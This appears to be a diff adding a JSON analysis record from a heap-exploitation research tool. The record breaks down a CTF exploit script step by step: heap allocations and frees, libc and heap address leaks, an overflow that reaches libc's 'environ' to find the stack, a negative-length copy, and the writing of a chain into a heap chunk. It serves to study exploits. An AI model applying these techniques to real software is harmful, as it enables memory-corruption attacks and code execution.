@@ -1,0 +1,1626 @@
+{
+  "run_id": "run_ffdea34524cb4b6eaf7c59b5f993fabd",
+  "case_id": "local.ruanan.poc-pwn_traditional_base64_heap_refactor.fb7cb12f",
+  "source_hash": "fb7cb12f7b508a2054f3570f6b4f6f4132d2f29e1cd3dd9d4a1a0ee4e7903fe3",
+  "model": "static-only",
+  "prompt_version": "",
+  "status": "completed",
+  "source_path": "C:\\Users\\WYH\\Desktop\\pwncraft\\pwncraft_v0.5.0\\artifacts\\heap_ai_writeups\\ruanan_finals_v1\\sources\\ruanan-fb7cb12f7b508a20.py",
+  "purpose": "semantic",
+  "static": {
+    "valid": true,
+    "operations": [
+      {
+        "op_id": "op_001",
+        "kind": "alloc",
+        "chunk": "A",
+        "index": "0",
+        "request_size": "0x100",
+        "data": "0",
+        "field": "",
+        "value": "",
+        "target": "",
+        "fd_storage": "",
+        "count": 1,
+        "note": "from EXP: c.add(0x100, idx) [idx=0]",
+        "meta": {
+          "parse_confidence": "confirmed"
+        }
+      },
+      {
+        "op_id": "op_002",
+        "kind": "alloc",
+        "chunk": "B",
+        "index": "1",
+        "request_size": "0x100",
+        "data": "1",
+        "field": "",
+        "value": "",
+        "target": "",
+        "fd_storage": "",
+        "count": 1,
+        "note": "from EXP: c.add(0x100, idx) [idx=1]",
+        "meta": {
+          "parse_confidence": "confirmed"
+        }
+      },
+      {
+        "op_id": "op_003",
+        "kind": "alloc",
+        "chunk": "C",
+        "index": "2",
+        "request_size": "0x100",
+        "data": "2",
+        "field": "",
+        "value": "",
+        "target": "",
+        "fd_storage": "",
+        "count": 1,
+        "note": "from EXP: c.add(0x100, idx) [idx=2]",
+        "meta": {
+          "parse_confidence": "confirmed"
+        }
+      },
+      {
+        "op_id": "op_004",
+        "kind": "alloc",
+        "chunk": "D",
+        "index": "3",
+        "request_size": "0x100",
+        "data": "3",
+        "field": "",
+        "value": "",
+        "target": "",
+        "fd_storage": "",
+        "count": 1,
+        "note": "from EXP: c.add(0x100, idx) [idx=3]",
+        "meta": {
+          "parse_confidence": "confirmed"
+        }
+      },
+      {
+        "op_id": "op_005",
+        "kind": "alloc",
+        "chunk": "E",
+        "index": "4",
+        "request_size": "0x100",
+        "data": "4",
+        "field": "",
+        "value": "",
+        "target": "",
+        "fd_storage": "",
+        "count": 1,
+        "note": "from EXP: c.add(0x100, idx) [idx=4]",
+        "meta": {
+          "parse_confidence": "confirmed"
+        }
+      },
+      {
+        "op_id": "op_006",
+        "kind": "alloc",
+        "chunk": "F",
+        "index": "5",
+        "request_size": "0x100",
+        "data": "5",
+        "field": "",
+        "value": "",
+        "target": "",
+        "fd_storage": "",
+        "count": 1,
+        "note": "from EXP: c.add(0x100, idx) [idx=5]",
+        "meta": {
+          "parse_confidence": "confirmed"
+        }
+      },
+      {
+        "op_id": "op_007",
+        "kind": "alloc",
+        "chunk": "G",
+        "index": "6",
+        "request_size": "0x100",
+        "data": "6",
+        "field": "",
+        "value": "",
+        "target": "",
+        "fd_storage": "",
+        "count": 1,
+        "note": "from EXP: c.add(0x100, idx) [idx=6]",
+        "meta": {
+          "parse_confidence": "confirmed"
+        }
+      },
+      {
+        "op_id": "op_008",
+        "kind": "alloc",
+        "chunk": "H",
+        "index": "7",
+        "request_size": "0x100",
+        "data": "7",
+        "field": "",
+        "value": "",
+        "target": "",
+        "fd_storage": "",
+        "count": 1,
+        "note": "from EXP: c.add(0x100, idx) [idx=7]",
+        "meta": {
+          "parse_confidence": "confirmed"
+        }
+      },
+      {
+        "op_id": "op_009",
+        "kind": "free",
+        "chunk": "B",
+        "index": "1",
+        "request_size": "",
+        "data": "",
+        "field": "",
+        "value": "",
+        "target": "",
+        "fd_storage": "",
+        "count": 1,
+        "note": "from EXP: c.delete(idx) [idx=1]",
+        "meta": {}
+      },
+      {
+        "op_id": "op_010",
+        "kind": "free",
+        "chunk": "C",
+        "index": "2",
+        "request_size": "",
+        "data": "",
+        "field": "",
+        "value": "",
+        "target": "",
+        "fd_storage": "",
+        "count": 1,
+        "note": "from EXP: c.delete(idx) [idx=2]",
+        "meta": {}
+      },
+      {
+        "op_id": "op_011",
+        "kind": "free",
+        "chunk": "D",
+        "index": "3",
+        "request_size": "",
+        "data": "",
+        "field": "",
+        "value": "",
+        "target": "",
+        "fd_storage": "",
+        "count": 1,
+        "note": "from EXP: c.delete(idx) [idx=3]",
+        "meta": {}
+      },
+      {
+        "op_id": "op_012",
+        "kind": "free",
+        "chunk": "E",
+        "index": "4",
+        "request_size": "",
+        "data": "",
+        "field": "",
+        "value": "",
+        "target": "",
+        "fd_storage": "",
+        "count": 1,
+        "note": "from EXP: c.delete(idx) [idx=4]",
+        "meta": {}
+      },
+      {
+        "op_id": "op_013",
+        "kind": "free",
+        "chunk": "F",
+        "index": "5",
+        "request_size": "",
+        "data": "",
+        "field": "",
+        "value": "",
+        "target": "",
+        "fd_storage": "",
+        "count": 1,
+        "note": "from EXP: c.delete(idx) [idx=5]",
+        "meta": {}
+      },
+      {
+        "op_id": "op_014",
+        "kind": "free",
+        "chunk": "G",
+        "index": "6",
+        "request_size": "",
+        "data": "",
+        "field": "",
+        "value": "",
+        "target": "",
+        "fd_storage": "",
+        "count": 1,
+        "note": "from EXP: c.delete(idx) [idx=6]",
+        "meta": {}
+      },
+      {
+        "op_id": "op_015",
+        "kind": "free",
+        "chunk": "H",
+        "index": "7",
+        "request_size": "",
+        "data": "",
+        "field": "",
+        "value": "",
+        "target": "",
+        "fd_storage": "",
+        "count": 1,
+        "note": "from EXP: c.delete(idx) [idx=7]",
+        "meta": {}
+      },
+      {
+        "op_id": "op_016",
+        "kind": "free",
+        "chunk": "A",
+        "index": "0",
+        "request_size": "",
+        "data": "",
+        "field": "",
+        "value": "",
+        "target": "",
+        "fd_storage": "",
+        "count": 1,
+        "note": "from EXP: c.delete(0)",
+        "meta": {}
+      },
+      {
+        "op_id": "op_017",
+        "kind": "alloc",
+        "chunk": "I",
+        "index": "8",
+        "request_size": "0x100",
+        "data": "1",
+        "field": "",
+        "value": "",
+        "target": "",
+        "fd_storage": "",
+        "count": 1,
+        "note": "from EXP: c.add(0x100, idx) [idx=1]",
+        "meta": {
+          "parse_confidence": "confirmed"
+        }
+      },
+      {
+        "op_id": "op_018",
+        "kind": "alloc",
+        "chunk": "J",
+        "index": "9",
+        "request_size": "0x100",
+        "data": "2",
+        "field": "",
+        "value": "",
+        "target": "",
+        "fd_storage": "",
+        "count": 1,
+        "note": "from EXP: c.add(0x100, idx) [idx=2]",
+        "meta": {
+          "parse_confidence": "confirmed"
+        }
+      },
+      {
+        "op_id": "op_019",
+        "kind": "alloc",
+        "chunk": "K",
+        "index": "10",
+        "request_size": "0x100",
+        "data": "3",
+        "field": "",
+        "value": "",
+        "target": "",
+        "fd_storage": "",
+        "count": 1,
+        "note": "from EXP: c.add(0x100, idx) [idx=3]",
+        "meta": {
+          "parse_confidence": "confirmed"
+        }
+      },
+      {
+        "op_id": "op_020",
+        "kind": "alloc",
+        "chunk": "L",
+        "index": "11",
+        "request_size": "0x100",
+        "data": "4",
+        "field": "",
+        "value": "",
+        "target": "",
+        "fd_storage": "",
+        "count": 1,
+        "note": "from EXP: c.add(0x100, idx) [idx=4]",
+        "meta": {
+          "parse_confidence": "confirmed"
+        }
+      },
+      {
+        "op_id": "op_021",
+        "kind": "alloc",
+        "chunk": "M",
+        "index": "12",
+        "request_size": "0x100",
+        "data": "5",
+        "field": "",
+        "value": "",
+        "target": "",
+        "fd_storage": "",
+        "count": 1,
+        "note": "from EXP: c.add(0x100, idx) [idx=5]",
+        "meta": {
+          "parse_confidence": "confirmed"
+        }
+      },
+      {
+        "op_id": "op_022",
+        "kind": "alloc",
+        "chunk": "N",
+        "index": "13",
+        "request_size": "0x100",
+        "data": "6",
+        "field": "",
+        "value": "",
+        "target": "",
+        "fd_storage": "",
+        "count": 1,
+        "note": "from EXP: c.add(0x100, idx) [idx=6]",
+        "meta": {
+          "parse_confidence": "confirmed"
+        }
+      },
+      {
+        "op_id": "op_023",
+        "kind": "alloc",
+        "chunk": "O",
+        "index": "14",
+        "request_size": "0x100",
+        "data": "7",
+        "field": "",
+        "value": "",
+        "target": "",
+        "fd_storage": "",
+        "count": 1,
+        "note": "from EXP: c.add(0x100, idx) [idx=7]",
+        "meta": {
+          "parse_confidence": "confirmed"
+        }
+      },
+      {
+        "op_id": "op_024",
+        "kind": "alloc",
+        "chunk": "P",
+        "index": "15",
+        "request_size": "0x100",
+        "data": "0",
+        "field": "",
+        "value": "",
+        "target": "",
+        "fd_storage": "",
+        "count": 1,
+        "note": "from EXP: c.add(0x100, 0)",
+        "meta": {
+          "parse_confidence": "confirmed"
+        }
+      },
+      {
+        "op_id": "op_025",
+        "kind": "show",
+        "chunk": "A",
+        "index": "0",
+        "request_size": "",
+        "data": "",
+        "field": "",
+        "value": "",
+        "target": "",
+        "fd_storage": "",
+        "count": 1,
+        "note": "from EXP: c.show(0)",
+        "meta": {
+          "function": "show",
+          "expression": "c.show(0)",
+          "result_var": "leak"
+        }
+      },
+      {
+        "op_id": "op_026",
+        "kind": "derive_value",
+        "chunk": "libc.address",
+        "index": "",
+        "request_size": "",
+        "data": "",
+        "field": "",
+        "value": "read_ptr(c.io, 6) - 0x233C20",
+        "target": "",
+        "fd_storage": "",
+        "count": 1,
+        "note": "from EXP: libc.address = read_ptr(c.io, 6) - 0x233C20",
+        "meta": {
+          "result_var": "libc.address",
+          "expression": "read_ptr(c.io, 6) - 0x233C20",
+          "dependencies": "leak",
+          "source_kind": "recv",
+          "source": "libc.address = read_ptr(c.io, 6) - 0x233C20",
+          "provenance": "inferred"
+        }
+      },
+      {
+        "op_id": "op_027",
+        "kind": "show",
+        "chunk": "H",
+        "index": "7",
+        "request_size": "",
+        "data": "",
+        "field": "",
+        "value": "",
+        "target": "",
+        "fd_storage": "",
+        "count": 1,
+        "note": "from EXP: c.show(7)",
+        "meta": {
+          "function": "show",
+          "expression": "c.show(7)",
+          "result_var": "leak_2"
+        }
+      },
+      {
+        "op_id": "op_028",
+        "kind": "derive_value",
+        "chunk": "heap_base",
+        "index": "",
+        "request_size": "",
+        "data": "",
+        "field": "",
+        "value": "read_ptr(c.io, 5) << 12",
+        "target": "",
+        "fd_storage": "",
+        "count": 1,
+        "note": "from EXP: heap_base = read_ptr(c.io, 5) << 12",
+        "meta": {
+          "result_var": "heap_base",
+          "expression": "read_ptr(c.io, 5) << 12",
+          "dependencies": "leak_2",
+          "source_kind": "recv",
+          "source": "heap_base = read_ptr(c.io, 5) << 12",
+          "provenance": "inferred"
+        }
+      },
+      {
+        "op_id": "op_029",
+        "kind": "alloc",
+        "chunk": "Q",
+        "index": "16",
+        "request_size": "0x380",
+        "data": "10",
+        "field": "",
+        "value": "",
+        "target": "",
+        "fd_storage": "",
+        "count": 1,
+        "note": "from EXP: c.add(0x380, 10)",
+        "meta": {
+          "parse_confidence": "confirmed"
+        }
+      },
+      {
+        "op_id": "op_030",
+        "kind": "free",
+        "chunk": "K",
+        "index": "10",
+        "request_size": "",
+        "data": "",
+        "field": "",
+        "value": "",
+        "target": "",
+        "fd_storage": "",
+        "count": 1,
+        "note": "from EXP: c.delete(10)",
+        "meta": {}
+      },
+      {
+        "op_id": "op_031",
+        "kind": "edit",
+        "chunk": "A",
+        "index": "0",
+        "request_size": "",
+        "data": "b\"a\" * 96 + p64(libc.sym[\"environ\"] - 0x18)",
+        "field": "",
+        "value": "",
+        "target": "",
+        "fd_storage": "",
+        "count": 1,
+        "note": "from EXP: c.edit(0, b\"a\" * 96 + p64(libc.sym[\"environ\"] - 0x18))",
+        "meta": {}
+      },
+      {
+        "op_id": "op_032",
+        "kind": "edit",
+        "chunk": "H",
+        "index": "7",
+        "request_size": "",
+        "data": "b\"b\" * 0x100",
+        "field": "",
+        "value": "",
+        "target": "",
+        "fd_storage": "",
+        "count": 1,
+        "note": "from EXP: c.edit(7, b\"b\" * 0x100)",
+        "meta": {}
+      },
+      {
+        "op_id": "op_033",
+        "kind": "copy",
+        "chunk": "A",
+        "index": "0",
+        "request_size": "(-0x10) & 0xFFFFFFFF",
+        "data": "",
+        "field": "",
+        "value": "",
+        "target": "H",
+        "fd_storage": "",
+        "count": 1,
+        "note": "from EXP: c.copy(7, 0, (-0x10) & 0xFFFFFFFF)",
+        "meta": {
+          "src": "7",
+          "dst": "0",
+          "length": "(-0x10) & 0xFFFFFFFF",
+          "src_chunk": "H",
+          "dst_chunk": "A"
+        }
+      },
+      {
+        "op_id": "op_034",
+        "kind": "alloc",
+        "chunk": "R",
+        "index": "17",
+        "request_size": "0x380",
+        "data": "10",
+        "field": "",
+        "value": "",
+        "target": "",
+        "fd_storage": "",
+        "count": 1,
+        "note": "from EXP: c.add(0x380, 10)",
+        "meta": {
+          "parse_confidence": "confirmed"
+        }
+      },
+      {
+        "op_id": "op_035",
+        "kind": "copy",
+        "chunk": "K",
+        "index": "10",
+        "request_size": "0x19",
+        "data": "",
+        "field": "",
+        "value": "",
+        "target": "A",
+        "fd_storage": "",
+        "count": 1,
+        "note": "from EXP: c.copy(0, 10, 0x19)",
+        "meta": {
+          "src": "0",
+          "dst": "10",
+          "length": "0x19",
+          "src_chunk": "A",
+          "dst_chunk": "K"
+        }
+      },
+      {
+        "op_id": "op_036",
+        "kind": "show",
+        "chunk": "K",
+        "index": "10",
+        "request_size": "",
+        "data": "",
+        "field": "",
+        "value": "",
+        "target": "",
+        "fd_storage": "",
+        "count": 1,
+        "note": "from EXP: c.show(10)",
+        "meta": {
+          "function": "show",
+          "expression": "c.show(10)",
+          "result_var": "leak_3"
+        }
+      },
+      {
+        "op_id": "op_037",
+        "kind": "derive_value",
+        "chunk": "stack_addr",
+        "index": "",
+        "request_size": "",
+        "data": "",
+        "field": "",
+        "value": "read_ptr(c.io, 6)",
+        "target": "",
+        "fd_storage": "",
+        "count": 1,
+        "note": "from EXP: stack_addr = read_ptr(c.io, 6)",
+        "meta": {
+          "result_var": "stack_addr",
+          "expression": "read_ptr(c.io, 6)",
+          "dependencies": "leak_3",
+          "source_kind": "recv",
+          "source": "stack_addr = read_ptr(c.io, 6)",
+          "provenance": "inferred"
+        }
+      },
+      {
+        "op_id": "op_038",
+        "kind": "alloc",
+        "chunk": "S",
+        "index": "18",
+        "request_size": "0x390",
+        "data": "11",
+        "field": "",
+        "value": "",
+        "target": "",
+        "fd_storage": "",
+        "count": 1,
+        "note": "from EXP: c.add(0x390, 11)",
+        "meta": {
+          "parse_confidence": "confirmed"
+        }
+      },
+      {
+        "op_id": "op_039",
+        "kind": "free",
+        "chunk": "L",
+        "index": "11",
+        "request_size": "",
+        "data": "",
+        "field": "",
+        "value": "",
+        "target": "",
+        "fd_storage": "",
+        "count": 1,
+        "note": "from EXP: c.delete(11)",
+        "meta": {}
+      },
+      {
+        "op_id": "op_040",
+        "kind": "edit",
+        "chunk": "A",
+        "index": "0",
+        "request_size": "",
+        "data": "b\"a\" * (96 + 8) + p64(stack_addr - 0x11F2 - 0x20)",
+        "field": "",
+        "value": "",
+        "target": "",
+        "fd_storage": "",
+        "count": 1,
+        "note": "from EXP: c.edit(0, b\"a\" * (96 + 8) + p64(stack_addr - 0x11F2 - 0x20))",
+        "meta": {}
+      },
+      {
+        "op_id": "op_041",
+        "kind": "copy",
+        "chunk": "A",
+        "index": "0",
+        "request_size": "(-0x10) & 0xFFFFFFFF",
+        "data": "",
+        "field": "",
+        "value": "",
+        "target": "H",
+        "fd_storage": "",
+        "count": 1,
+        "note": "from EXP: c.copy(7, 0, (-0x10) & 0xFFFFFFFF)",
+        "meta": {
+          "src": "7",
+          "dst": "0",
+          "length": "(-0x10) & 0xFFFFFFFF",
+          "src_chunk": "H",
+          "dst_chunk": "A"
+        }
+      },
+      {
+        "op_id": "op_042",
+        "kind": "alloc",
+        "chunk": "T",
+        "index": "19",
+        "request_size": "0x390",
+        "data": "11",
+        "field": "",
+        "value": "",
+        "target": "",
+        "fd_storage": "",
+        "count": 1,
+        "note": "from EXP: c.add(0x390, 11)",
+        "meta": {
+          "parse_confidence": "confirmed"
+        }
+      },
+      {
+        "op_id": "op_043",
+        "kind": "edit",
+        "chunk": "H",
+        "index": "7",
+        "request_size": "",
+        "data": "chain",
+        "field": "",
+        "value": "",
+        "target": "",
+        "fd_storage": "",
+        "count": 1,
+        "note": "from EXP: c.edit(7, chain)",
+        "meta": {}
+      },
+      {
+        "op_id": "op_044",
+        "kind": "copy",
+        "chunk": "L",
+        "index": "11",
+        "request_size": "0x100",
+        "data": "",
+        "field": "",
+        "value": "",
+        "target": "H",
+        "fd_storage": "",
+        "count": 1,
+        "note": "from EXP: c.copy(7, 11, 0x100)",
+        "meta": {
+          "src": "7",
+          "dst": "11",
+          "length": "0x100",
+          "src_chunk": "H",
+          "dst_chunk": "L"
+        }
+      }
+    ],
+    "bindings": [
+      {
+        "source_id": "source_fde1ef94fcfdf121",
+        "start": 1503,
+        "end": 1520,
+        "line": 58,
+        "end_line": 58,
+        "fingerprint": "81523b6e492f88ee",
+        "loop_env": [
+          [
+            "idx",
+            "0"
+          ]
+        ],
+        "confidence": "confirmed",
+        "match_status": "matched"
+      },
+      {
+        "source_id": "source_b27fbc68fe7e399b",
+        "start": 1503,
+        "end": 1520,
+        "line": 58,
+        "end_line": 58,
+        "fingerprint": "81523b6e492f88ee",
+        "loop_env": [
+          [
+            "idx",
+            "1"
+          ]
+        ],
+        "confidence": "confirmed",
+        "match_status": "matched"
+      },
+      {
+        "source_id": "source_82c93d29f111e2c8",
+        "start": 1503,
+        "end": 1520,
+        "line": 58,
+        "end_line": 58,
+        "fingerprint": "81523b6e492f88ee",
+        "loop_env": [
+          [
+            "idx",
+            "2"
+          ]
+        ],
+        "confidence": "confirmed",
+        "match_status": "matched"
+      },
+      {
+        "source_id": "source_1b7bebe910e3acb1",
+        "start": 1503,
+        "end": 1520,
+        "line": 58,
+        "end_line": 58,
+        "fingerprint": "81523b6e492f88ee",
+        "loop_env": [
+          [
+            "idx",
+            "3"
+          ]
+        ],
+        "confidence": "confirmed",
+        "match_status": "matched"
+      },
+      {
+        "source_id": "source_774ebc4fcaa2b852",
+        "start": 1503,
+        "end": 1520,
+        "line": 58,
+        "end_line": 58,
+        "fingerprint": "81523b6e492f88ee",
+        "loop_env": [
+          [
+            "idx",
+            "4"
+          ]
+        ],
+        "confidence": "confirmed",
+        "match_status": "matched"
+      },
+      {
+        "source_id": "source_6e934b82fd4ed278",
+        "start": 1503,
+        "end": 1520,
+        "line": 58,
+        "end_line": 58,
+        "fingerprint": "81523b6e492f88ee",
+        "loop_env": [
+          [
+            "idx",
+            "5"
+          ]
+        ],
+        "confidence": "confirmed",
+        "match_status": "matched"
+      },
+      {
+        "source_id": "source_5c42b755914341dc",
+        "start": 1503,
+        "end": 1520,
+        "line": 58,
+        "end_line": 58,
+        "fingerprint": "81523b6e492f88ee",
+        "loop_env": [
+          [
+            "idx",
+            "6"
+          ]
+        ],
+        "confidence": "confirmed",
+        "match_status": "matched"
+      },
+      {
+        "source_id": "source_62e9b8025e3ba4b6",
+        "start": 1503,
+        "end": 1520,
+        "line": 58,
+        "end_line": 58,
+        "fingerprint": "81523b6e492f88ee",
+        "loop_env": [
+          [
+            "idx",
+            "7"
+          ]
+        ],
+        "confidence": "confirmed",
+        "match_status": "matched"
+      },
+      {
+        "source_id": "source_d223ca6636b5b378",
+        "start": 1558,
+        "end": 1571,
+        "line": 61,
+        "end_line": 61,
+        "fingerprint": "8ee244ba2f73e8f3",
+        "loop_env": [
+          [
+            "idx",
+            "1"
+          ]
+        ],
+        "confidence": "confirmed",
+        "match_status": "matched"
+      },
+      {
+        "source_id": "source_c7275aeb98aaf63f",
+        "start": 1558,
+        "end": 1571,
+        "line": 61,
+        "end_line": 61,
+        "fingerprint": "8ee244ba2f73e8f3",
+        "loop_env": [
+          [
+            "idx",
+            "2"
+          ]
+        ],
+        "confidence": "confirmed",
+        "match_status": "matched"
+      },
+      {
+        "source_id": "source_90812c7692d0d085",
+        "start": 1558,
+        "end": 1571,
+        "line": 61,
+        "end_line": 61,
+        "fingerprint": "8ee244ba2f73e8f3",
+        "loop_env": [
+          [
+            "idx",
+            "3"
+          ]
+        ],
+        "confidence": "confirmed",
+        "match_status": "matched"
+      },
+      {
+        "source_id": "source_44cca6ff93c6846c",
+        "start": 1558,
+        "end": 1571,
+        "line": 61,
+        "end_line": 61,
+        "fingerprint": "8ee244ba2f73e8f3",
+        "loop_env": [
+          [
+            "idx",
+            "4"
+          ]
+        ],
+        "confidence": "confirmed",
+        "match_status": "matched"
+      },
+      {
+        "source_id": "source_954356a2537e525f",
+        "start": 1558,
+        "end": 1571,
+        "line": 61,
+        "end_line": 61,
+        "fingerprint": "8ee244ba2f73e8f3",
+        "loop_env": [
+          [
+            "idx",
+            "5"
+          ]
+        ],
+        "confidence": "confirmed",
+        "match_status": "matched"
+      },
+      {
+        "source_id": "source_b34c240d95528f2c",
+        "start": 1558,
+        "end": 1571,
+        "line": 61,
+        "end_line": 61,
+        "fingerprint": "8ee244ba2f73e8f3",
+        "loop_env": [
+          [
+            "idx",
+            "6"
+          ]
+        ],
+        "confidence": "confirmed",
+        "match_status": "matched"
+      },
+      {
+        "source_id": "source_9d71db033aad164d",
+        "start": 1558,
+        "end": 1571,
+        "line": 61,
+        "end_line": 61,
+        "fingerprint": "8ee244ba2f73e8f3",
+        "loop_env": [
+          [
+            "idx",
+            "7"
+          ]
+        ],
+        "confidence": "confirmed",
+        "match_status": "matched"
+      },
+      {
+        "source_id": "source_6ab2ec4a6acd0918",
+        "start": 1576,
+        "end": 1587,
+        "line": 62,
+        "end_line": 62,
+        "fingerprint": "f2936ce92a3a2112",
+        "loop_env": [],
+        "confidence": "confirmed",
+        "match_status": "matched"
+      },
+      {
+        "source_id": "source_b27fbc68fe7e399b",
+        "start": 1625,
+        "end": 1642,
+        "line": 65,
+        "end_line": 65,
+        "fingerprint": "81523b6e492f88ee",
+        "loop_env": [
+          [
+            "idx",
+            "1"
+          ]
+        ],
+        "confidence": "confirmed",
+        "match_status": "matched"
+      },
+      {
+        "source_id": "source_82c93d29f111e2c8",
+        "start": 1625,
+        "end": 1642,
+        "line": 65,
+        "end_line": 65,
+        "fingerprint": "81523b6e492f88ee",
+        "loop_env": [
+          [
+            "idx",
+            "2"
+          ]
+        ],
+        "confidence": "confirmed",
+        "match_status": "matched"
+      },
+      {
+        "source_id": "source_1b7bebe910e3acb1",
+        "start": 1625,
+        "end": 1642,
+        "line": 65,
+        "end_line": 65,
+        "fingerprint": "81523b6e492f88ee",
+        "loop_env": [
+          [
+            "idx",
+            "3"
+          ]
+        ],
+        "confidence": "confirmed",
+        "match_status": "matched"
+      },
+      {
+        "source_id": "source_774ebc4fcaa2b852",
+        "start": 1625,
+        "end": 1642,
+        "line": 65,
+        "end_line": 65,
+        "fingerprint": "81523b6e492f88ee",
+        "loop_env": [
+          [
+            "idx",
+            "4"
+          ]
+        ],
+        "confidence": "confirmed",
+        "match_status": "matched"
+      },
+      {
+        "source_id": "source_6e934b82fd4ed278",
+        "start": 1625,
+        "end": 1642,
+        "line": 65,
+        "end_line": 65,
+        "fingerprint": "81523b6e492f88ee",
+        "loop_env": [
+          [
+            "idx",
+            "5"
+          ]
+        ],
+        "confidence": "confirmed",
+        "match_status": "matched"
+      },
+      {
+        "source_id": "source_5c42b755914341dc",
+        "start": 1625,
+        "end": 1642,
+        "line": 65,
+        "end_line": 65,
+        "fingerprint": "81523b6e492f88ee",
+        "loop_env": [
+          [
+            "idx",
+            "6"
+          ]
+        ],
+        "confidence": "confirmed",
+        "match_status": "matched"
+      },
+      {
+        "source_id": "source_62e9b8025e3ba4b6",
+        "start": 1625,
+        "end": 1642,
+        "line": 65,
+        "end_line": 65,
+        "fingerprint": "81523b6e492f88ee",
+        "loop_env": [
+          [
+            "idx",
+            "7"
+          ]
+        ],
+        "confidence": "confirmed",
+        "match_status": "matched"
+      },
+      {
+        "source_id": "source_a6a5817f681e0779",
+        "start": 1647,
+        "end": 1662,
+        "line": 66,
+        "end_line": 66,
+        "fingerprint": "87b8e2c1e2cf47b0",
+        "loop_env": [],
+        "confidence": "confirmed",
+        "match_status": "matched"
+      },
+      {
+        "source_id": "source_16399e7697fa09a0",
+        "start": 1668,
+        "end": 1677,
+        "line": 68,
+        "end_line": 68,
+        "fingerprint": "b9eea82793013282",
+        "loop_env": [],
+        "confidence": "confirmed",
+        "match_status": "matched"
+      },
+      {
+        "source_id": "source_15299782ae7afdb7",
+        "start": 1682,
+        "end": 1725,
+        "line": 69,
+        "end_line": 69,
+        "fingerprint": "37b5354dbdaa10ba",
+        "loop_env": [],
+        "confidence": "inferred",
+        "match_status": "matched"
+      },
+      {
+        "source_id": "source_9c2be038ba26fa66",
+        "start": 1731,
+        "end": 1740,
+        "line": 71,
+        "end_line": 71,
+        "fingerprint": "60c252fe134cadb1",
+        "loop_env": [],
+        "confidence": "confirmed",
+        "match_status": "matched"
+      },
+      {
+        "source_id": "source_e501bfbc6990f621",
+        "start": 1745,
+        "end": 1780,
+        "line": 72,
+        "end_line": 72,
+        "fingerprint": "0c697fed18e90730",
+        "loop_env": [],
+        "confidence": "inferred",
+        "match_status": "matched"
+      },
+      {
+        "source_id": "source_7cb593eb5016d64d",
+        "start": 1786,
+        "end": 1802,
+        "line": 74,
+        "end_line": 74,
+        "fingerprint": "70db6f363f23c7fa",
+        "loop_env": [],
+        "confidence": "confirmed",
+        "match_status": "matched"
+      },
+      {
+        "source_id": "source_50f1ecaf0bcf9e87",
+        "start": 1807,
+        "end": 1819,
+        "line": 75,
+        "end_line": 75,
+        "fingerprint": "dc3aad71872bc66f",
+        "loop_env": [],
+        "confidence": "confirmed",
+        "match_status": "matched"
+      },
+      {
+        "source_id": "source_9e43173305916b89",
+        "start": 1825,
+        "end": 1879,
+        "line": 77,
+        "end_line": 77,
+        "fingerprint": "28057bf33f9040f6",
+        "loop_env": [],
+        "confidence": "confirmed",
+        "match_status": "matched"
+      },
+      {
+        "source_id": "source_751b607546c7d4f5",
+        "start": 1884,
+        "end": 1907,
+        "line": 78,
+        "end_line": 78,
+        "fingerprint": "70b3949b84885e4f",
+        "loop_env": [],
+        "confidence": "confirmed",
+        "match_status": "matched"
+      },
+      {
+        "source_id": "source_a09bf117160f5d84",
+        "start": 1912,
+        "end": 1946,
+        "line": 79,
+        "end_line": 79,
+        "fingerprint": "e88e69af9b69c30e",
+        "loop_env": [],
+        "confidence": "confirmed",
+        "match_status": "matched"
+      },
+      {
+        "source_id": "source_7cb593eb5016d64d",
+        "start": 1952,
+        "end": 1968,
+        "line": 81,
+        "end_line": 81,
+        "fingerprint": "70db6f363f23c7fa",
+        "loop_env": [],
+        "confidence": "confirmed",
+        "match_status": "matched"
+      },
+      {
+        "source_id": "source_a4525facfeec9acb",
+        "start": 1973,
+        "end": 1992,
+        "line": 82,
+        "end_line": 82,
+        "fingerprint": "f5780408d143f57e",
+        "loop_env": [],
+        "confidence": "confirmed",
+        "match_status": "matched"
+      },
+      {
+        "source_id": "source_ad681e6a8b7c8368",
+        "start": 1997,
+        "end": 2007,
+        "line": 83,
+        "end_line": 83,
+        "fingerprint": "326da7fdefe330fd",
+        "loop_env": [],
+        "confidence": "confirmed",
+        "match_status": "matched"
+      },
+      {
+        "source_id": "source_9ce49e6f90034e4f",
+        "start": 2032,
+        "end": 2062,
+        "line": 85,
+        "end_line": 85,
+        "fingerprint": "aea71fdccadaa703",
+        "loop_env": [],
+        "confidence": "inferred",
+        "match_status": "matched"
+      },
+      {
+        "source_id": "source_3cc408871cecf852",
+        "start": 2068,
+        "end": 2084,
+        "line": 87,
+        "end_line": 87,
+        "fingerprint": "f7b51e872ced0117",
+        "loop_env": [],
+        "confidence": "confirmed",
+        "match_status": "matched"
+      },
+      {
+        "source_id": "source_fd5585d636663261",
+        "start": 2089,
+        "end": 2101,
+        "line": 88,
+        "end_line": 88,
+        "fingerprint": "24805b0b5d0bcf4f",
+        "loop_env": [],
+        "confidence": "confirmed",
+        "match_status": "matched"
+      },
+      {
+        "source_id": "source_1129668de129e64f",
+        "start": 2106,
+        "end": 2166,
+        "line": 89,
+        "end_line": 89,
+        "fingerprint": "fe28b1aa5201de70",
+        "loop_env": [],
+        "confidence": "confirmed",
+        "match_status": "matched"
+      },
+      {
+        "source_id": "source_a09bf117160f5d84",
+        "start": 2171,
+        "end": 2205,
+        "line": 90,
+        "end_line": 90,
+        "fingerprint": "e88e69af9b69c30e",
+        "loop_env": [],
+        "confidence": "confirmed",
+        "match_status": "matched"
+      },
+      {
+        "source_id": "source_3cc408871cecf852",
+        "start": 2210,
+        "end": 2226,
+        "line": 91,
+        "end_line": 91,
+        "fingerprint": "f7b51e872ced0117",
+        "loop_env": [],
+        "confidence": "confirmed",
+        "match_status": "matched"
+      },
+      {
+        "source_id": "source_0ebb4c7a6093d9b9",
+        "start": 2717,
+        "end": 2733,
+        "line": 111,
+        "end_line": 111,
+        "fingerprint": "7a0826989eb845d5",
+        "loop_env": [],
+        "confidence": "confirmed",
+        "match_status": "matched"
+      },
+      {
+        "source_id": "source_2278a36c9899006a",
+        "start": 2738,
+        "end": 2758,
+        "line": 112,
+        "end_line": 112,
+        "fingerprint": "e38bff7621c3ed2d",
+        "loop_env": [],
+        "confidence": "confirmed",
+        "match_status": "matched"
+      }
+    ],
+    "branches": [],
+    "diagnostics": [
+      {
+        "severity": "info",
+        "code": "inlined_entrypoint",
+        "message": "已静态内联入口函数 `main`。",
+        "start": 3610,
+        "end": 3616,
+        "line": 138,
+        "suggestion": ""
+      },
+      {
+        "severity": "info",
+        "code": "inlined_entrypoint",
+        "message": "已静态内联入口函数 `exploit`。",
+        "start": 3538,
